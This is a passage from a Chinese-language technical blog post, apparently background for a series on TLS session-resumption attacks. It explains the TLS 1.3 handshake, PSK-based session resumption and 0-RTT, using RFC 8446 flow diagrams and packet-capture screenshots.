，服务端不需要在本地存储会话信息，因此与有状态的会话恢复相比，它是一个更具扩展性的选择。</p><h3 id="TLS-1-3"><a href="#TLS-1-3" class="headerlink" title="TLS 1.3"></a>TLS 1.3</h3><h4 id="TLS-1-3-Overview"><a href="#TLS-1-3-Overview" class="headerlink" title="TLS 1.3 Overview"></a>TLS 1.3 Overview</h4><p>TLS 1.3 可以说是 TLS 1.2 的升级版本，它在 RFC 8446 中定义，于 2018 年 8 月发表。我们这里简要的介绍几个我们比较关心的改动：</p><ul><li>减少握手等待时间，将握手时间从 2-RTT 降低到 1-RTT，并且增加 0-RTT 模式。</li><li>废除 Session ID 和 Session Ticket 会话恢复方式，统一通过 PSK 的方式进行会话恢复，并在 NewSessionTicket 消息中添加过期时间和用于混淆时间的偏移值。</li></ul><p>在握手时相对于 TLS 1.2 发生了比较明显的改动：</p><ol><li>与 TLS 1.2 握手类似，TLS 1.3 握手以 Client Hello 消息开始，但有一个重要的变化就是客户端发送支持的加密套件列表，并猜测服务器可能选择的密钥协议协议，也会发送它对该特定密钥协议协议的密钥共享。</li><li>Server 在回复 Server Hello 时，服务器回复它所选择的密钥协议协议，其中也包括服务器的密钥共享、证书以及 Server Finished 。</li><li>现在，客户端检查服务器证书，生成密钥，并发送 Client Finished ，之后就可以发送加密数据了。</li></ol><p>这样一来，TLS 1.3 握手就节省了整整一个来回和数百毫秒的时间，比 TLS 1.2 握手有了很大的改进。RFC 8446 提供的简要流程图如下：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="hljs-built_in"> Client </span>                                          Server</span><br><span class="line"></span><br><span class="line">Key  ^ ClientHello</span><br><span class="line">Exch | + key_share*</span><br><span class="line">     | + signature_algorithms*</span><br><span class="line">     | + psk_key_exchange_modes*</span><br><span class="line">     v + pre_shared_key*       --------&gt;</span><br><span class="line">                                                  ServerHello  ^ Key</span><br><span class="line">                                                 + key_share*  | Exch</span><br><span class="line">                                            + pre_shared_key*  v</span><br><span class="line">                                        {EncryptedExtensions}  ^  Server</span><br><span class="line">                                        {CertificateRequest*}  v  Params</span><br><span class="line">                                               {Certificate*}  ^</span><br><span class="line">                                         {CertificateVerify*}  | Auth</span><br><span class="line">                                                   {Finished}  v</span><br><span class="line">                               &lt;--------  [Application Data*]</span><br><span class="line">     ^ {Certificate*}</span><br><span class="line">Auth | {CertificateVerify*}</span><br><span class="line">     v {Finished}              --------&gt;</span><br><span class="line">       [Application Data]      &lt;-------&gt;  [Application Data]</span><br><span class="line"></span><br><span class="line">              +  Indicates noteworthy extensions sent <span class="hljs-keyword">in</span> the</span><br><span class="line">                 previously noted message.</span><br><span class="line"></span><br><span class="line">              *  Indicates optional <span class="hljs-keyword">or</span> situation-dependent</span><br><span class="line">                 messages/extensions that are <span class="hljs-keyword">not</span> always sent.</span><br><span class="line"></span><br><span class="line">              {} Indicates messages protected using keys</span><br><span class="line">                 derived <span class="hljs-keyword">from</span> a [sender]_handshake_traffic_secret.</span><br><span class="line"></span><br><span class="line">              [] Indicates messages protected using keys</span><br><span class="line">                 derived <span class="hljs-keyword">from</span> [sender]_application_traffic_secret_N.</span><br><span class="line"></span><br><span class="line">               Figure 1: Message Flow <span class="hljs-keyword">for</span> Full TLS Handshake</span><br></pre></td></tr></tbody></table></figure><p></p><p>TLS 1.2 与 1.3 简要的握手对比如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/7.png" alt=""></p><h4 id="TLS-1-3-Session-Resumption-PSK"><a href="#TLS-1-3-Session-Resumption-PSK" class="headerlink" title="TLS 1.3 Session Resumption - PSK"></a>TLS 1.3 Session Resumption - PSK</h4><p>按照上文所说，TLS 1.3 用通过预共享密钥（Pre-Shared Key, PSK）恢复会话的概念取代了 1.2 当中的 Session ID 和 Session Ticket 。在最初的握手之后，服务器向客户端发送一个 PSK 标识。 PSK 内容取决于服务器，可能包含一个数据库查询密钥或一个自我加密和自我认证的票据。客户端将此PSK身份与自己的会话密钥一起存储。其中， RFC 8446 定义的 PSK 结构如下所示：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">    opaque identity&lt;<span class="hljs-number">1.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">    <span class="hljs-built_in">uint</span>32 obfuscated_ticket_age;</span><br><span class="line">} PskIdentity;</span><br><span class="line"></span><br><span class="line">opaque PskBinderEntry&lt;<span class="hljs-number">32.</span><span class="hljs-number">.255</span>&gt;;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">    PskIdentity identities&lt;<span class="hljs-number">7.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">    PskBinderEntry binders&lt;<span class="hljs-number">33.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">} OfferedPsks;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">    select (Handshake.msg_type) {</span><br><span class="line">        <span class="hljs-keyword">case</span> client_hello: OfferedPsks;</span><br><span class="line">        <span class="hljs-keyword">case</span> server_hello: <span class="hljs-built_in">uint</span>16 selected_identity;</span><br><span class="line">    };</span><br><span class="line">} PreSharedKeyExtension;</span><br></pre></td></tr></tbody></table></figure><p></p><p>在随后的握手中，客户端在给服务器的 ClientHello 消息中提供这个 PSK ，服务器根据 PSK 的内容对票据进行解密，并使用包含的会话密钥和连接状态来恢复会话，或者服务器使用包含的查找密钥在自己的数据库中查找会话密钥和连接状态。 RFC 8446 提供了一个 Session Resumption 的流程图如下：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">      <span class="hljs-built_in"> Client </span>                                              Server</span><br><span class="line"></span><br><span class="line">Initial Handshake:</span><br><span class="line">       ClientHello</span><br><span class="line">       + key_share               --------&gt;</span><br><span class="line">                                                       ServerHello</span><br><span class="line">                                                       + key_share</span><br><span class="line">                                             {EncryptedExtensions}</span><br><span class="line">                                             {CertificateRequest*}</span><br><span class="line">                                                    {Certificate*}</span><br><span class="line">                                              {CertificateVerify*}</span><br><span class="line">                                                        {Finished}</span><br><span class="line">                                 &lt;--------     [Application Data*]</span><br><span class="line">       {Certificate*}</span><br><span class="line">       {CertificateVerify*}</span><br><span class="line">       {Finished}                --------&gt;</span><br><span class="line">                                 &lt;--------      [NewSessionTicket]</span><br><span class="line">       [Application Data]        &lt;-------&gt;      [Application Data]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subsequent Handshake:</span><br><span class="line">       ClientHello</span><br><span class="line">       + key_share*</span><br><span class="line">       + pre_shared_key          --------&gt;</span><br><span class="line">                                                       ServerHello</span><br><span class="line">                                                  + pre_shared_key</span><br><span class="line">                                                      + key_share*</span><br><span class="line">                                             {EncryptedExtensions}</span><br><span class="line">                                                        {Finished}</span><br><span class="line">                                 &lt;--------     [Application Data*]</span><br><span class="line">       {Finished}                --------&gt;</span><br><span class="line">       [Application Data]        &lt;-------&gt;      [Application Data]</span><br><span class="line"></span><br><span class="line">            Figure 3: Message Flow <span class="hljs-keyword">for</span> Resumption <span class="hljs-keyword">and</span> PSK</span><br></pre></td></tr></tbody></table></figure><p></p><ol><li>客户端向服务器发送一个带有 key_share 扩展的 ClientHello 消息。该扩展列出了客户端支持的密钥交换加密方法。</li><li>服务器用一个带有 key_share 扩展名的 ServerHello 消息进行响应，这个扩展包含了它要用于密钥交换的加密方法，并且服务器将其参数一同发送给客户端。</li><li>服务器和客户端都交换认证消息。</li><li>服务器向客户端发送 NewSessionTicket 消息，其中包含一个 PSK ，客户端可以通过在 ClientHello 消息的 pre_shared_key 扩展中包含这个 PSK ，用于未来的握手。</li><li>客户端和服务器现在可以交换加密的应用数据。</li><li>在未来的握手中，客户端向服务器发送一个包含 key_share 和 pre_shared_key 扩展名的 ClientHello 消息。 pre_shared_key 扩展包含 NewTicketSession 消息中发送的 PSK 。</li><li>服务器用包含 pre_shared_key 和 key_share 扩展名的 ServerHello 消息作出响应。 pre_shared_key 扩展包含服务器同意使用的 PSK ，并将其参数发送给客户端。</li><li>服务器和客户端互相发送 Finished 消息，之后客户端和服务器可以交换加密的应用数据。</li></ol><p>我们可以通过一个简单的例子来直观感受一下 TLS 1.3 基于 PSK 的握手过程：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/1.png" alt=""></p><p>如上图所示，Client 第一次与 Server 握手发送 Client Hello 消息时，只包含了 key_share 拓展，Server 也做出响应的回应，使用包含 key_share 拓展的消息进行回应。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/2.png" alt=""></p><p>Client 在第二次发送 Client Hello 消息时，带上了之前 Server 在 NewSessionTicket 发送的 pre_shared_key ，将其作为拓展发送至 Server ，随后 Server 响应 Server Hello 消息时，也使用 pre_shared_key 作为拓展响应，这样就完成了基于 PSK 的 Session Resumption </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/3.png" alt=""></p><p>可能有同学会问为什么我们看不到类似 TLS 1.2 当中直接有一个 NewSessionTicket 呢？我们可以仔细回顾一下上面的 RFC 流程图，Server 返回的 NewSessionTicket 消息有个中括号，而这里的中括号表示的是使用从 <code>[sender]_application_traffic_secret_N</code> 导出的密钥保护的信息，所以我们使用 wireshark 无法直接看到其中的内容，但是其中我们使用 opnssl 时候能够更明显的看到 Server 发过来的 TLS Session Ticket ，如图所示，也就是我们 Client 在进行恢复会话时所携带的 PSK ，在使用 openssl 进行恢复会话时，就会提示我们已经恢复了会话。这样就完成了一次 Session Resumption</p><h4 id="TLS-1-3-Session-Resumption-0-RTT"><a href="#TLS-1-3-Session-Resumption-0-RTT" class="headerlink" title="TLS 1.3 Session Resumption - 0-RTT"></a>TLS 1.3 Session Resumption - 0-RTT</h4><p>虽然 TLS 1.3 最大的亮点之一是 0-RTT ，但是我们这里不做详细的分析，因为我们可以从下面的 RFC 8446 提供的流程图看出来，虽然增加了一个 early_data ，但是对于本篇文章来说并不是重点，他依然使用了 pre_shared_key ，所以对于上文基于 PSK 的会话恢复模式来说基本一致，这里就不做过多分析，感兴趣的同学可以自行搜索了解。 </p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Client                                               Server</span><br><span class="line"></span><br><span class="line">ClientHello</span><br><span class="line">+ early_data</span><br><span class="line">+ key_share*</span><br><span class="line">+ psk_key_exchange_modes</span><br><span class="line">+ pre_shared_key</span><br><span class="line">(Application Data*)     --------&gt;</span><br><span class="line">                                                ServerHello</span><br><span class="line">                                           + 